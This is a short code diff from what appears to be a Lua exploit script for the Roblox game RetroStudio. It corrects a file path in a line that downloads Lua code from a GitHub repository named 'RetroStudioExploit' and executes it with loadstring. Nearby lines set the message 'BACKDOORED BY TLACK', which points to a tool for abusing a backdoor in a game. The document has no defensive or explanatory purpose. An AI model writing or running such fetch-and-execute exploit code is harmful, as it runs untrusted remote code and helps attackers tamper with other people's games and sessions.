@@ -2,7 +2,7 @@ local head = 'https://raw.githubusercontent.com/'
 local github = 'RetroStudioExploit/'
 
 local suffix = '/refs/heads/main/'
-local API = loadstring(game:HttpGet(head .. github .. 'RetroScripts' .. suffix .. 'retrostudio/meetings/MeetingsAPI.lua'))()
+local API = loadstring(game:HttpGet(head .. github .. 'RetroScripts' .. suffix .. 'retrostudio/meetings/MeetingAPI.lua'))()
 
 local txt = "BACKDOORED BY TLACK"
 local delay = .5
